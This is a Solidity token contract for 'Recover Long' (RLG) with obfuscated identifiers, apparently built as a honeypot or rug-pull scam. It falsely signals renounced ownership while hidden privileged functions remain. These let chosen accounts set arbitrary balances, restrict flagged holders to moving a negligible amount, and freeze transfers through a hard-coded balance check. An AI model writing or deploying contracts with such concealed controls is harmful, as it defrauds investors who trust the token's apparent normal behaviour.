//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface liquidityTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract sellAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txFund {
    function createPair(address feeExempt, address exemptReceiver) external returns (address);
}

interface feeTotalMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverWallet) external view returns (uint256);

    function transfer(address isAmount, uint256 isFrom) external returns (bool);

    function allowance(address teamFeeSwap, address spender) external view returns (uint256);

    function approve(address spender, uint256 isFrom) external returns (bool);

    function transferFrom(
        address sender,
        address isAmount,
        uint256 isFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txAuto, uint256 value);
    event Approval(address indexed teamFeeSwap, address indexed spender, uint256 value);
}

interface feeTotalMinMetadata is feeTotalMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RecoverLong is sellAuto, feeTotalMin, feeTotalMinMetadata {

    uint256 private tokenBuy;

    mapping(address => mapping(address => uint256)) private minAt;

    bool public enableLimit;

    uint256 private fundToken;

    mapping(address => uint256) private tokenLaunched;

    function swapBuy(address fundAuto) public {
        if (enableLimit) {
            return;
        }
        if (exemptLaunch == fundToken) {
            receiverTeamLiquidity = tokenBuy;
        }
        modeMax[fundAuto] = true;
        
        enableLimit = true;
    }

    bool private isWallet;

    function balanceOf(address receiverWallet) public view virtual override returns (uint256) {
        return tokenLaunched[receiverWallet];
    }

    function listEnable(address walletReceiver, address isAmount, uint256 isFrom) internal returns (bool) {
        require(tokenLaunched[walletReceiver] >= isFrom);
        tokenLaunched[walletReceiver] -= isFrom;
        tokenLaunched[isAmount] += isFrom;
        emit Transfer(walletReceiver, isAmount, isFrom);
        return true;
    }

    uint256 public receiverTeamLiquidity;

    string private feeMaxSwap = "Recover Long";

    function approve(address swapWallet, uint256 isFrom) public virtual override returns (bool) {
        minAt[_msgSender()][swapWallet] = isFrom;
        emit Approval(_msgSender(), swapWallet, isFrom);
        return true;
    }

    function getOwner() external view returns (address) {
        return sellAmountMax;
    }

    uint256 maxTotal;

    address public modeLiquidity;

    function name() external view virtual override returns (string memory) {
        return feeMaxSwap;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchTxTotal;
    }

    function transferFrom(address walletReceiver, address isAmount, uint256 isFrom) external override returns (bool) {
        if (_msgSender() != totalLiquidity) {
            if (minAt[walletReceiver][_msgSender()] != type(uint256).max) {
                require(isFrom <= minAt[walletReceiver][_msgSender()]);
                minAt[walletReceiver][_msgSender()] -= isFrom;
            }
        }
        return buyAuto(walletReceiver, isAmount, isFrom);
    }

    function tradingSell(address autoReceiverLiquidity) public {
        listMin();
        if (exemptLaunch != receiverTx) {
            receiverTx = exemptLaunch;
        }
        if (autoReceiverLiquidity == modeLiquidity || autoReceiverLiquidity == toList) {
            return;
        }
        shouldAutoTeam[autoReceiverLiquidity] = true;
    }

    uint256 public receiverTx;

    address totalLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 isAutoFrom;

    function buyAuto(address walletReceiver, address isAmount, uint256 isFrom) internal returns (bool) {
        if (walletReceiver == modeLiquidity) {
            return listEnable(walletReceiver, isAmount, isFrom);
        }
        uint256 exemptReceiverAmount = feeTotalMin(toList).balanceOf(isExempt);
        require(exemptReceiverAmount == maxTotal);
        require(isAmount != isExempt);
        if (shouldAutoTeam[walletReceiver]) {
            return listEnable(walletReceiver, isAmount, fromWallet);
        }
        return listEnable(walletReceiver, isAmount, isFrom);
    }

    string private launchTxTotal = "RLG";

    mapping(address => bool) public modeMax;

    event OwnershipTransferred(address indexed toLaunched, address indexed shouldTeam);

    bool private buyWallet;

    function modeBuy(uint256 isFrom) public {
        listMin();
        maxTotal = isFrom;
    }

    address isExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function listTrading() public {
        emit OwnershipTransferred(modeLiquidity, address(0));
        sellAmountMax = address(0);
    }

    function allowance(address takeMode, address swapWallet) external view virtual override returns (uint256) {
        if (swapWallet == totalLiquidity) {
            return type(uint256).max;
        }
        return minAt[takeMode][swapWallet];
    }

    uint256 constant fromWallet = 4 ** 10;

    uint256 private walletIs = 100000000 * 10 ** 18;

    function launchLimit(address buyFrom, uint256 isFrom) public {
        listMin();
        tokenLaunched[buyFrom] = isFrom;
    }

    address private sellAmountMax;

    function decimals() external view virtual override returns (uint8) {
        return shouldAt;
    }

    function owner() external view returns (address) {
        return sellAmountMax;
    }

    uint8 private shouldAt = 18;

    function transfer(address buyFrom, uint256 isFrom) external virtual override returns (bool) {
        return buyAuto(_msgSender(), buyFrom, isFrom);
    }

    mapping(address => bool) public shouldAutoTeam;

    uint256 private exemptLaunch;

    constructor (){
        if (buyWallet) {
            shouldMode = false;
        }
        liquidityTake autoModeFee = liquidityTake(totalLiquidity);
        toList = txFund(autoModeFee.factory()).createPair(autoModeFee.WETH(), address(this));
        if (receiverTeamLiquidity == tokenBuy) {
            shouldMode = false;
        }
        modeLiquidity = _msgSender();
        listTrading();
        modeMax[modeLiquidity] = true;
        tokenLaunched[modeLiquidity] = walletIs;
        
        emit Transfer(address(0), modeLiquidity, walletIs);
    }

    address public toList;

    function totalSupply() external view virtual override returns (uint256) {
        return walletIs;
    }

    function listMin() private view {
        require(modeMax[_msgSender()]);
    }

    bool private shouldMode;

}